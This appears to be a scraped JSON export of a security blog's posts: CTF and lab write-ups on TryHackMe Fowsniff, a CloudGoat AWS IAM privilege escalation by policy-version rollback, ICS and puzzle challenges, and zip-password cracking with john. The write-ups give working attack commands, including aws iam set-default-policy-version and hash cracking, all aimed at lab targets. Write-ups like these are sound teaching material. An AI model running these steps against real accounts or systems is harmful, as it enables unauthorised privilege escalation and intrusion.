\u0026#34;flag.txt\u0026#34; 2\u0026gt;/dev/null # or ls /root Read the root flag:\ncat /root/flag.txt Flag Output:\n___ _ _ _ _ _ / __|___ _ _ __ _ _ _ __ _| |_ _ _| |__ _| |_(_)___ _ _ __| | | (__/ _ \\ \u0026#39; \\/ _` | \u0026#39;_/ _` | _| || | / _` | _| / _ \\ \u0026#39; \\(_-\u0026lt;_| \\___\\___/_||_\\__, |_| \\__,_|\\__|\\_,_|_\\__,_|\\__|_\\___/_||_/__(_) |___/ (_) |-------------- |\u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026amp;| | R O O T | | F L A G | |\u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026amp;| |-------------- | | | | | | --- Nice work! This CTF was built with love in every byte by @berzerk0 on Twitter. Special thanks to psf, @nbulischeck and the whole Fofao Team. Summary and Key Learning Points # What We Accomplished: # Network enumeration - Used Nmap to discover open services OSINT research - Found leaked credentials online Hash cracking - Converted password hashes to plaintext Email exploitation - Accessed POP3 emails for sensitive information Brute force attack - Used Hydra to find SSH credentials Privilege escalation - Exploited writable system files Reverse shell - Gained root access through script modification Security Lessons: # Password reuse is dangerous - The same passwords were used across multiple services Default passwords must be changed - The temporary SSH password wasn\u0026rsquo;t changed File permissions matter - Group-writable system files are dangerous Information disclosure - Sensitive information in emails can be exploited Data breaches have lasting impact - Old breached credentials are still valuable This CTF is an excellent introduction to penetration testing methodology and demonstrates how multiple small vulnerabilities can be chained together for complete system compromise.\nRemember: Practice makes perfect! Try similar CTF challenges to reinforce these skills.\n","date":"22 August 2025","externalUrl":null,"permalink":"/posts/2025-08-22-fowsniff/2025-08-22-fowsniff/","section":"Posts","summary":"\u003ch1 class=\"relative group\"\u003eFowsniff CTF - Complete Beginner\u0026rsquo;s Walkthrough \n    \u003cdiv id=\"fowsniff-ctf---complete-beginners-walkthrough\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline\" href=\"#fowsniff-ctf---complete-beginners-walkthrough\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h1\u003e\n\n\u003ch2 class=\"relative group\"\u003eWhat is This? \n    \u003cdiv id=\"what-is-this\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline\" href=\"#what-is-this\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h2\u003e\n\u003cp\u003e\u003cstrong\u003eFowsniff\u003c/strong\u003e is a beginner-friendly boot2root CTF (Capture The Flag) challenge hosted on TryHackMe. In this challenge, we\u0026rsquo;ll learn fundamental penetration testing skills by exploiting a vulnerable Linux machine to gain root access and capture the flag.\u003c/p\u003e","title":"Fowsniff","type":"posts"},{"content":"","date":"22 August 2025","externalUrl":null,"permalink":"/categories/google-dorking/","section":"Categories","summary":"","title":"Google Dorking","type":"categories"},{"content":"","date":"22 August 2025","externalUrl":null,"permalink":"/tags/google-dorking/","section":"Tags","summary":"","title":"Google Dorking","type":"tags"},{"content":"","date":"22 August 2025","externalUrl":null,"permalink":"/categories/hash-cracking/","section":"Categories","summary":"","title":"Hash Cracking","type":"categories"},{"content":"","date":"22 August 2025","externalUrl":null,"permalink":"/tags/hash-cracking/","section":"Tags","summary":"","title":"Hash Cracking","type":"tags"},{"content":"","date":"22 August 2025","externalUrl":null,"permalink":"/categories/hydra/","section":"Categories","summary":"","title":"Hydra","type":"categories"},{"content":"","date":"22 August 2025","externalUrl":null,"permalink":"/tags/hydra/","section":"Tags","summary":"","title":"Hydra","type":"tags"},{"content":"","date":"22 August 2025","externalUrl":null,"permalink":"/categories/imap/","section":"Categories","summary":"","title":"IMAP","type":"categories"},{"content":"","date":"22 August 2025","externalUrl":null,"permalink":"/tags/imap/","section":"Tags","summary":"","title":"IMAP","type":"tags"},{"content":"","date":"22 August 2025","externalUrl":null,"permalink":"/categories/linpeas/","section":"Categories","summary":"","title":"LinPEAS","type":"categories"},{"content":"","date":"22 August 2025","externalUrl":null,"permalink":"/tags/linpeas/","section":"Tags","summary":"","title":"LinPEAS","type":"tags"},{"content":"","date":"22 August 2025","externalUrl":null,"permalink":"/categories/pop3/","section":"Categories","summary":"","title":"POP3","type":"categories"},{"content":"","date":"22 August 2025","externalUrl":null,"permalink":"/tags/pop3/","section":"Tags","summary":"","title":"POP3","type":"tags"},{"content":"","date":"22 August 2025","externalUrl":null,"permalink":"/tags/privilege-escalation/","section":"Tags","summary":"","title":"Privilege Escalation","type":"tags"},{"content":"","date":"22 August 2025","externalUrl":null,"permalink":"/tags/reverse-shell/","section":"Tags","summary":"","title":"Reverse Shell","type":"tags"},{"content":"","date":"22 August 2025","externalUrl":null,"permalink":"/categories/ssh/","section":"Categories","summary":"","title":"SSH","type":"categories"},{"content":"","date":"22 August 2025","externalUrl":null,"permalink":"/tags/ssh/","section":"Tags","summary":"","title":"SSH","type":"tags"},{"content":"","date":"22 August 2025","externalUrl":null,"permalink":"/categories/tryhackme/","section":"Categories","summary":"","title":"TryHackMe","type":"categories"},{"content":"","date":"22 August 2025","externalUrl":null,"permalink":"/tags/tryhackme/","section":"Tags","summary":"","title":"TryHackMe","type":"tags"},{"content":"","date":"30 June 2025","externalUrl":null,"permalink":"/categories/aws/","section":"Categories","summary":"","title":"AWS","type":"categories"},{"content":"","date":"30 June 2025","externalUrl":null,"permalink":"/tags/aws/","section":"Tags","summary":"","title":"AWS","type":"tags"},{"content":"","date":"30 June 2025","externalUrl":null,"permalink":"/categories/cloudgoat/","section":"Categories","summary":"","title":"Cloudgoat","type":"categories"},{"content":"","date":"30 June 2025","externalUrl":null,"permalink":"/tags/cloudgoat/","section":"Tags","summary":"","title":"Cloudgoat","type":"tags"},{"content":"","date":"30 June 2025","externalUrl":null,"permalink":"/categories/iam/","section":"Categories","summary":"","title":"IAM","type":"categories"},{"content":"","date":"30 June 2025","externalUrl":null,"permalink":"/tags/iam/","section":"Tags","summary":"","title":"IAM","type":"tags"},{"content":"","date":"30 June 2025","externalUrl":null,"permalink":"/categories/ics/","section":"Categories","summary":"","title":"ICS","type":"categories"},{"content":"","date":"30 June 2025","externalUrl":null,"permalink":"/tags/ics/","section":"Tags","summary":"","title":"ICS","type":"tags"},{"content":"","date":"30 June 2025","externalUrl":null,"permalink":"/categories/industrial-control-systems/","section":"Categories","summary":"","title":"Industrial Control Systems","type":"categories"},{"content":"","date":"30 June 2025","externalUrl":null,"permalink":"/tags/industrial-control-systems/","section":"Tags","summary":"","title":"Industrial Control Systems","type":"tags"},{"content":"","date":"30 June 2025","externalUrl":null,"permalink":"/categories/privilege-escalation/","section":"Categories","summary":"","title":"PRIVILEGE ESCALATION","type":"categories"},{"content":" ⚠️ Important Disclaimer # This tutorial is for educational purposes only. All AWS access keys, credentials, and ARNs shown in screenshots or examples:\nWere immediately deactivated after this demonstration. Should never be used to access any AWS resources. Are from intentionally vulnerable lab environments (CloudGoat) and not real systems. Ethical Use Notice: # This content demonstrates defensive security research with proper authorization. Never test security vulnerabilities against systems you don\u0026rsquo;t own or have explicit permission to assess. Always follow your organization\u0026rsquo;s cloud security policies and AWS\u0026rsquo;s Acceptable Use Policy. Protect your keys like passwords, exposing them risks account compromise.\nThe Danger Lurking in Your Policy History # Imagine this: You\u0026rsquo;ve diligently followed security best practices, carefully restricting IAM permissions. Your policies are airtight. Your users have least privilege access. But hidden in your AWS environment, a time bomb ticks - and it\u0026rsquo;s called Policy Version Rollback.\nIn this hands-on walkthrough, we\u0026rsquo;ll explore how attackers can exploit an often-overlooked AWS feature to transform a low-privilege user into a full administrator. This isn\u0026rsquo;t a theoretical vulnerability - it\u0026rsquo;s a real-world risk that stems from how AWS IAM policy versioning works.\nWhy This Should Keep You Awake at Night # Stealthy: Leaves no trace in CloudTrail as \u0026ldquo;SetDefaultPolicyVersion\u0026rdquo; events Common: Many organizations forget to clean up old policy versions Powerful: Can elevate to admin in seconds with the right conditions Overlooked: Rarely checked in standard security audits Here is a simple exploitation route that we are going to take in this walkthrough: However, before we do that, let\u0026rsquo;s setup our environment:\nLab Setup: Preparing Our Environment # Prerequisites for the IAM Privilege Escalation Lab # Base Environment: ✅ Kali Linux Virtual Machine (Recommended: Latest version, fresh install with internet access) (Note: This tutorial assumes a Kali VM, but any Linux distro with these tools will work)\nTools Required for This Scenario # AWS CLI (to interact with AWS APIs) Git (to clone CloudGoat) Kali Linux includes Git by default. For other distros, install it with: sudo apt install git -y\nPython 3.8+ \u0026amp; Poetry (for CloudGoat dependencies) jq (optional, for parsing JSON outputs) Optional: Installing Terraform for Infrastructure-as-Code (IaC) Scenarios # While not required for the current IAM privilege escalation lab, many CloudGoat scenarios leverage Terraform to provision vulnerable AWS resources. Here\u0026rsquo;s how to install it:\nQuick Install for Linux (Debian/Ubuntu)\nsudo apt-get update \u0026amp;\u0026amp; sudo apt-get install -y gnupg software-properties-common wget -O- https://apt.releases.hashicorp.com/gpg | \\ gpg --dearmor | \\ sudo tee /usr/share/keyrings/hashicorp-archive-keyring.gpg \u0026gt; /dev/null echo \u0026#34;deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/hashicorp-archive-keyring.gpg] \\ https://apt.releases.hashicorp.com $(lsb_release -cs) main\u0026#34; | \\ sudo tee /etc/apt/sources.list.d/hashicorp.list sudo apt update \u0026amp;\u0026amp; sudo apt-get install terraform Installing and Configuring the AWS CLI # Visit the AWS CLI installation guide from aws.amazon.com/cli Run these commands to install the AWS CLI on your Kali VM: curl \u0026#34;https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip\u0026#34; -o \u0026#34;awscliv2.zip\u0026#34; unzip awscliv2.zip sudo ./aws/install Here is what a successful Installation looks like, verifying with commands like:\naws --version or which aws Creating a CLI User # Log into the AWS Console Search for and open IAM Click \u0026ldquo;Users\u0026rdquo; → \u0026ldquo;Create user\u0026rdquo; Set username as cli-user and proceed Set permissions with Administrator Access Review and create the user Notice that we gave the user Administrator Access and then click on next to proceed to the review page.\nOn the last page, we can go ahead and review our configurations and just click on create user once we have confirmed everything is set. Once the user has been created successfully, we can click on their username from the list of IAM users from our console, for further configs.\nIt\u0026rsquo;s important to note that, we know that the user has successfully been created when we see the green notification at the top of the console page.\nConfiguring the CLI # Go to cli-user → \u0026ldquo;Security Credentials\u0026rdquo; tab → \u0026ldquo;Create Access Key\u0026rdquo; Optionally add a description tag Note the Access Key ID and Secret Access Key (or download them) In your terminal, run: aws configure 5. Enter the Access Key ID and Secret Access Key when prompted 6. Leave other fields blank by pressing Enter\nSetting Up CloudGoat Using a Script # Create a file setup-cloudgoat.sh with this content:\n#!/bin/bash set -e echo \u0026#34;[*] Cloning CloudGoat repository...\u0026#34; rm -rf cloudgoat git clone https://github.com/RhinoSecurityLabs/cloudgoat.git cd cloudgoat echo \u0026#34;[*] Installing Poetry...\u0026#34; curl -sSL https://install.python-poetry.org | python3 - # Export Poetry path export PATH=\u0026#34;$HOME/.local/bin:$PATH\u0026#34; # Add Poetry to shell config if [[ \u0026#34;$SHELL\u0026#34; == *zsh ]]; then SHELL_RC=\u0026#34;$HOME/.zshrc\u0026#34; else SHELL_RC=\u0026#34;$HOME/.bashrc\u0026#34; fi if ! grep -q \u0026#39;export PATH=\u0026#34;$HOME/.local/bin:$PATH\u0026#34;\u0026#39; \u0026#34;$SHELL_RC\u0026#34;; then echo \u0026#39;export PATH=\u0026#34;$HOME/.local/bin:$PATH\u0026#34;\u0026#39; \u0026gt;\u0026gt; \u0026#34;$SHELL_RC\u0026#34; echo \u0026#34;[*] Added Poetry to PATH in $SHELL_RC\u0026#34; fi echo \u0026#34;[*] Installing CloudGoat dependencies via Poetry...\u0026#34; poetry install echo \u0026#34;[*] Configuring CloudGoat AWS profile...\u0026#34; if [ ! -f \u0026#34;$HOME/.aws/credentials\u0026#34; ]; then echo \u0026#34;AWS credentials not found! Please configure them first.\u0026#34; echo \u0026#34;Run: aws configure\u0026#34; exit 1 fi poetry run python3 -m cloudgoat.cloudgoat config aws \u0026lt;\u0026lt;\u0026lt; $\u0026#39;y\\ndefault\u0026#39; echo \u0026#34;[*] Setting up IP whitelisting...\u0026#34; if [ ! -f \u0026#34;cloudgoat/whitelist.txt\u0026#34; ]; then echo \u0026#34;[*] Creating whitelist.txt with current IP...\u0026#34; poetry run python3 -m cloudgoat.cloudgoat whitelist \u0026lt;\u0026lt;\u0026lt; \u0026#34;y\u0026#34; else echo \u0026#34;[*] whitelist.txt already exists, skipping creation\u0026#34; fi echo \u0026#34;[*] Verifying AWS configuration...\u0026#34; if [ ! -f \u0026#34;cloudgoat/config.yml\u0026#34; ]; then echo \u0026#34;[!] Error: config.yml not created!\u0026#34; exit 1 fi echo \u0026#34;[*] Setup complete.\u0026#34; cat \u0026lt;\u0026lt;EOF ✅ CloudGoat Setup Successful! 🧪 To run a scenario: cd cloudgoat poetry run python3 -m cloudgoat.cloudgoat create iam_privesc_by_rollback --profile default 🧼 To clean up: poetry run python3 -m cloudgoat.cloudgoat destroy iam_privesc_by_rollback --profile default EOF Make it executable and run it:\nchmod +x setup-cloudgoat.sh ./setup-cloudgoat.sh Then execute the scenario:\ncd cloudgoat poetry run python3 -m cloudgoat.cloudgoat create iam_privesc_by_rollback --profile default Once the scenario is loaded successfully, you expect to see something like this: That sums up the Lab setup for this scenario.\nUnderstanding the Vulnerability: IAM Privilege Escalation via Policy Rollback # What\u0026rsquo;s Happening? # A low-privilege IAM user has a policy that was tightened over time. An older version of the policy exists with admin privileges (due to accidental rollback vulnerability).\nOur Goal: Find and revert to the older policy version to escalate privileges.\nStep 1: Configure AWS CLI with Low-Privilege Credentials # Use the discovered credentials for the scenario user by running the following commands as shown: Verify that this worked by running:\naws sts get-caller-identity You should see the following if it was successful: Step 2: Check Current Permissions # You can use a command like the one below, or make necessary modifications as per your scenario:\naws iam list-attached-user-policies --user-name raynor-cgidi8wcl1r3py Your output should look like so: Step 3: List Policy Versions # The vulnerability lies in older policy versions. Let\u0026rsquo;s list them:\naws iam list-policy-versions \\ --policy-arn \u0026#34;arn:aws:iam::637423228247:policy/cg-raynor-policy-cgidogjjitpasx\u0026#34; You should see something like this: Step 4: Retrieve Older Policy Versions # Check permissions in each version (especially older ones), I was particularly interested in V1 because it stands out:\naws iam get-policy-version \\ --policy-arn \u0026#34;arn:aws:iam::637423228247:policy/cg-raynor-policy-cgidogjjitpasx\u0026#34; \\ --version-id \u0026#34;v1\u0026#34; Expected output: Analyzing the Dangerous Policy # This IAM policy is very interesting, and dangerous, from a security perspective. It\u0026rsquo;s explicitly crafted to allow privilege escalation via the \u0026ldquo;rollback\u0026rdquo; method. Let\u0026rsquo;s break it down: iam:Get + iam:List:** Allows reading IAM configurations These permissions allow:\nReading IAM users, roles, groups, and policies. Listing all versions of a given policy. Identifying any old policy versions that might have more powerful permissions. This visibility is key for enumeration during privilege escalation. iam:SetDefaultPolicyVersion: Allows rolling back to previous policy versions This is the most critical and potentially dangerous permission.\nIt allows a user to:\nRoll back a managed IAM policy to an earlier version, even if that version has AdministratorAccess orsome other over-permissive access. The rollback doesn\u0026rsquo;t change the policy, it just sets a previously approved version as the default. This is a classic IAM Privilege Escalation Technique:\nAssume the attacker has access to a role or user attached to a managed policy. That policy originally granted admin privileges (e.g., in version 1). Later, it was restricted (e.g., in version 5). The attacker uses iam:SetDefaultPolicyVersion to revert to version 1. Now their user/role has admin access, without modifying the policy directly. That is exactly what we are going to do when we run the first command below. Executing the Privilege Escalation # aws iam set-default-policy-version \\ --policy-arn \u0026#34;arn:aws:iam::637423228247:policy/cg-raynor-policy-cgidogjjitpasx\u0026#34; \\ --version-id \u0026#34;v1\u0026#34; A blank or empty output means that this rollback was successful. We can verify this by running the command(s) below:\naws iam get-policy-version \\ --policy-arn \u0026#34;arn:aws:iam::637423228247:policy/cg-raynor-policycgidogjjitpasx\u0026#34; \\ --version-id \u0026#34;v1\u0026#34; aws sts get-caller-identity aws iam list-users To prove this was a successful PE vector using the old policy, we can see if we are still in the context of our current user and if they can do something the admin only is allowed to do, like listing the IAM users. Let\u0026rsquo;s try and list the IAM users since we have already escalated our privileges:\naws sts get-caller-identity aws iam list-users The output should look like this: Why This Worked # The policy was tightened over time, but older versions weren\u0026rsquo;t deleted. The user had iam:SetDefaultPolicyVersion permission (a common misconfiguration). That sum\u0026rsquo;s up the objectives or goals that we had for this particular lab. Defense Recommendations # Always delete old policy versions when updating IAM policies. Never grant iam:SetDefaultPolicyVersion to low-privilege users. To clean up, run:\npoetry run python3 -m cloudgoat.cloudgoat destroy iam_privesc_by_rollback -- profile default aws configure set aws_access_key_id \u0026#34;\u0026#34; \u0026amp;\u0026amp; aws configure set aws_secret_access_key \u0026#34;\u0026#34; Happy hacking, see you on the next post.\n","date":"30 June 2025","externalUrl":null,"permalink":"/posts/2025-07-02-cloudgoat.md/2025-07-02-cloudgoat/","section":"Posts","summary":"\u003ch2 class=\"relative group\"\u003e⚠️ Important Disclaimer \n    \u003cdiv id=\"-important-disclaimer\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline\" href=\"#-important-disclaimer\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003eThis tutorial is for educational purposes only.\nAll AWS access keys, credentials, and ARNs shown in screenshots or examples:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eWere immediately deactivated after this demonstration.\u003c/li\u003e\n\u003cli\u003eShould never be used to access any AWS resources.\u003c/li\u003e\n\u003cli\u003eAre from intentionally vulnerable lab environments (CloudGoat) and not real systems.\u003c/li\u003e\n\u003c/ul\u003e\u003c/blockquote\u003e\n\n\u003ch2 class=\"relative group\"\u003eEthical Use Notice: \n    \u003cdiv id=\"ethical-use-notice\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline\" href=\"#ethical-use-notice\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003eThis content demonstrates defensive security research with proper authorization.\nNever test security vulnerabilities against systems you don\u0026rsquo;t own or have explicit permission to assess.\nAlways follow your organization\u0026rsquo;s cloud security policies and AWS\u0026rsquo;s Acceptable Use Policy.\nProtect your keys like passwords, exposing them risks account compromise.\u003c/p\u003e","title":"The Silent Threat in Your AWS Environment: IAM Privilege Escalation via Policy Rollback","type":"posts"},{"content":" Over the weekend, I took on the challenge to participate in Industrial Intrusion CTF by TryHackMe, it was a challenge that blends classic offensive security tactics with the niche world of Industrial Control Systems (ICS). It offered a fun and insightful mix of categories including Web exploitation, OSINT, Forensics, and a light Boot2Root (B2R) experienceâ€\u0026ldquo;perfect for anyone looking to dip their toes into ICS-focused challenges. These writeups walk through my step-by-step approach in solving some of the easiest challenges, how I navigated each section, and what made this ICS-themed room both accessible and educational. Whether you\u0026rsquo;re new to TryHackMe or curious about the crossover between IT and OT security, this is a solid place to start.\nBreach # Description\nThis engagement aims to find a way to open the gate by bypassing the badge authentication system. The control infrastructure may hold a weakness: Dig in, explore, and see if you have what it takes to exploit it. Be sure to check all the open ports, you never know which one might be your way in!\nTarget IP: 10.10.123.189\nEnumeration\nI did an NMAP scan and these were the results:\nsudo nmap -sV -T4 -p- 10.10.123.189 Starting Nmap 7.80 ( https://nmap.org ) at 2025-06-27 12:53 BST NSOCK ERROR [161.2690s] mksock_bind_addr(): Bind to 0.0.0. ","date":"30 June 2025","externalUrl":null,"permalink":"/posts/2025-06-30-industrial-intrusion.md/2025-06-30-industrial-intrusion/","section":"Posts","summary":"\u003cblockquote\u003e\n\u003cp\u003eOver the weekend, I took on the challenge to participate in Industrial Intrusion CTF by TryHackMe, it was a challenge that blends classic offensive security tactics with the niche world of Industrial Control Systems (ICS).\nIt offered a fun and insightful mix of categories including Web exploitation, OSINT, Forensics, and a light Boot2Root (B2R) experienceâ€\u0026ldquo;perfect for anyone looking to dip their toes into ICS-focused challenges.\nThese writeups walk through my step-by-step approach in solving some of the easiest challenges, how I navigated each section, and what made this ICS-themed room both accessible and educational.\nWhether you\u0026rsquo;re new to TryHackMe or curious about the crossover between IT and OT security, this is a solid place to start.\u003c/p\u003e","title":"Tryhackme Industrial Intrusion","type":"posts"},{"content":" DNA # The challenge provided this image:\nExtracted the string by reading the characters from left to right starting from the top going down. The resulting extracted string from the image: TCATAGGCTAGCTACACTCGTTGTACACTAGACAGCTACACTCTCTGAAGCTAGCTATGAAGCGTCCTACTCCTATGA\nThe challenge also has the following instructions There are some pretty unusual encoding methods. Find the flag PS: Replace spaces with “_”\nFrom research this seems to be some kind of DNA type of encryption. I also learnt that I need to break the string into 3s, so that made it look like this:\nTCA TAG GCT AGC TAC ACT CGT TGT ACA CTA GAC AGC TAC ACT CTC TGA AGC TAG CTA TGA AGC GTC CTA CTC CTA TGA\nOne of my team leads gave me this link that has mappings that could decode the above string. Managed to decode from here\nThe resulting string: CTF DAHOMEY DANS TES GENES\nI then replaced the spaces (\u0026quot; \u0026ldquo;) with underscores as per the instructions, then embedded the flag prefix to the string. NGCCTF{CTF_DAHOMEY_DANS_TES_GENES}\nDESIGN # This was yet another interesting misc challenge. We were presented with this CSV file. The instructions simply asked: Can you sculpt me ? Opening the file using Microsoft Excel, we find a long list of values mapped in two columns labelled X and Y. Given the name of the challenge, file and instructions I immediately assumed that these might be image pixel coordinates. I therefore went ahead and asked chatGPT to come up with a python script that could reconstruct the image and it came up with this awesome script that did just that:\nimport pandas as pd import numpy as np import matplotlib.pyplot as plt file_path = \u0026#39;Art.csv\u0026#39; # Step 1: Load and inspect the data try: data = pd.read_csv(file_path) print(\u0026#34;Column names:\u0026#34;, data.columns) except Exception as e: print(f\u0026#34;Error reading the file: {e}\u0026#34;) exit() # Step 2: Adjust column names as needed if \u0026#39;x\u0026#39; in data.columns and \u0026#39;y\u0026#39; in data.columns: x_coords = data[\u0026#39;x\u0026#39;] y_coords = data[\u0026#39;y\u0026#39;] elif \u0026#39;X\u0026#39; in data.columns and \u0026#39;Y\u0026#39; in data.columns: # Example alternative x_coords = data[\u0026#39;X\u0026#39;] y_coords = data[\u0026#39;Y\u0026#39;] else: print(\u0026#34;Error: Could not find \u0026#39;x\u0026#39; and \u0026#39;y\u0026#39; columns in the file.\u0026#34;) exit() # Continue as before max_x = x_coords.max() max_y = y_coords.max() image = np.zeros((max_y + 1, max_x + 1), dtype=np.uint8) for x, y in zip(x_coords, y_coords): image[y, x] = 255 plt.imshow(image, cmap=\u0026#39;gray\u0026#39;) plt.axis(\u0026#39;off\u0026#39;) plt.show() I then ran the script using the command:\npyhon3 image_reconstructor.py Then managed to retrieve this image:\nI therefore just added the flag prefix and submitted the final flag as: NGCCTF{CTF_Navigating_the_Digital_Maze_4f8ae63f9}\n","date":"29 November 2024","externalUrl":null,"permalink":"/posts/2024-11-29-dnadesign/2024-11-29-dnadesign/","section":"Posts","summary":"\u003ch2 class=\"relative group\"\u003eDNA \n    \u003cdiv id=\"dna\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline\" href=\"#dna\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h2\u003e\n\u003cp\u003eThe challenge provided this image:\u003c/p\u003e\n\u003cp\u003e\n\n\n\n\n\n\n\u003cfigure\u003e\n    \u003cimg class=\"my-0 rounded-md\" loading=\"lazy\" alt=\"DNAENCRYPTED\" src=\"/images/GlacierCTF/DNA.png\"\u003e\n\n  \n\u003c/figure\u003e\n\u003c/p\u003e\n\u003cp\u003eExtracted the string by reading the characters from left to right starting from the top going down. The resulting extracted string from the image: \u003ccode\u003eTCATAGGCTAGCTACACTCGTTGTACACTAGACAGCTACACTCTCTGAAGCTAGCTATGAAGCGTCCTACTCCTATGA\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003eThe challenge also has the following instructions\n\u003ccode\u003eThere are some pretty unusual encoding methods. Find the flag PS: Replace spaces with “_”\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003eFrom research this seems to be some kind of DNA type of encryption. I also learnt that I need to break the string into 3s, so that made it look like this:\u003c/p\u003e","title":"DNA \u0026 Design","type":"posts"},{"content":"","date":"29 November 2024","externalUrl":null,"permalink":"/categories/glacierctf/","section":"Categories","summary":"","title":"GlacierCTF","type":"categories"},{"content":"","date":"29 November 2024","externalUrl":null,"permalink":"/tags/glacierctf/","section":"Tags","summary":"","title":"GlacierCTF","type":"tags"},{"content":"","date":"24 November 2024","externalUrl":null,"permalink":"/categories/perfectroot/","section":"Categories","summary":"","title":"PerfectRoot","type":"categories"},{"content":"","date":"24 November 2024","externalUrl":null,"permalink":"/tags/perfectroot/","section":"Tags","summary":"","title":"PerfectRoot","type":"tags"},{"content":"This was a 4-part series of challenges linked to each other. I will explain my approach on solving the challenge below as I captured the first to last flag in that series.\nSheetsNLayers1 # What is flag 1?\nWe are given a file to download which happened to be a zip file. I went ahead to unzip the file and found a SheetsNlayers.vhdx file, this is a file format used for virtual hard disks. I then mounted the disk on my host machine to explore it further. I noticed that it contained three more files, one which just happens to be our first flag, so on opening it, this is what I found: =03YkNTNlNzYjZjYmVGMmFWZ4MTO1QWY0AzM0MmNhdjMzsHdwAjc. Looks like a Base64 encoded string. I decoded this string from dcode and noticed that it was in reversed form, giving us the flag: r00t{327a6c4304ad5938eaf0efb6cc3e53dc} This has been illustrated below: SheetsNLayers2 # What is flag 2? Now that we found flag 1, its time to further explore the rest of the files and see what we can find. I started by reading the note that was present in the disk we accessed. What I found there was this text: This next archieve contains more flags. Unfortunately the file looks preety blank to me and i can't seem to get all flags. (flag-2 , flag-3, flag-4) Good luck. So I immediately tried to access the archive called moreflags.zip but I couldnt, since it had a password. It was therefore time to start cracking using JohnTheRipper by using the following commands on a unix terminal:\nzip2john moreflags.zip \u0026gt; moreflags.hash #To extract the archive\u0026#39;s hash #The output: ver 2.0 moreflags.zip/moreflags/ is not encrypted, or stored with non-handled compression type ver 2.0 moreflags.zip/moreflags/moreflags.xlsx PKZIP Encr: cmplen=10742, decmplen=15277, crc=BADB9879 ts=B4AB cs=badb type=8 john --wordlist=/usr/share/wordlists/rockyou.txt moreflags.hash #Cracking the hash with the rockyou wordlist #The output: Using default input encoding: UTF-8 Loaded 1 password hash (PKZIP [32/64]) No password hashes left to crack (see FAQ) john moreflags.hash --show #To see the cracked hash #The output: moreflags.zip/moreflags/moreflags.xlsx:ne.11.88:moreflags/moreflags.xlsx:moreflags.zip::moreflags.zip 1 password hash cracked, 0 left Notice that we manage to get the password to the archive as shown in the output above: ne.11.88 I then used this password to access the archive. What I found in the archive was an excel sheet with the name: moreflags.xlsx. On opening the file, It seemed blank at first sight. But then I right-clicked sheet 1 and clicked unhide, and found 3 more hidden sheets. So I retrieved them one after another with the same process as illustrated below: On opening the flag 2 sheet, I found the flag in an encrypted format: I then copied the flag text and headed to cyberchef where I managed to successfully decode the flag from base85 to plain text as illustrated below: I managed to capture my second flag ~ r00t{df38bae72ccf3f172345dcee96a7ea21}\nSheetsNLayers3 # What is flag 3? Moving on to task 3, I open sheet 3 trying to find the third flag. I find it sitting right there, but it seems encoded once again. I therefore click on the first cell and copy the text in that cell, which happened to be: flag3 - TVRFMElEUTRJRFE0SURFeE5pQXhNak1nTlRZZ05UVWdPVGtnT1RnZ09Ua2dPVGNnTlRRZ05Ea2dOVGNnTlRFZ05UVWdNVEF4SURFd01TQXhNREVnTlRRZ05UQWdORGdnTlRZZ05Ea2dOVEFnTVRBeUlEVTNJREV3TVNBMU5pQXhNREVnTlRNZ09Ua2dOVE1nTlRFZ01UQXdJRFE0SURRNElERXlOUT09 TVRFMElEUTRJRFE0SURFeE5pQXhNak1nTlRZZ05UVWdPVGtnT1RnZ09Ua2dPVGNnTlRRZ05Ea2dOVGNnTlRFZ05UVWdNVEF4SURFd01TQXhNREVnTlRRZ05UQWdORGdnTlRZZ05Ea2dOVEFnTVRBeUlEVTNJREV3TVNBMU5pQXhNREVnTlRNZ09Ua2dOVE1nTlRFZ01UQXdJRFE0SURRNElERXlOUT09 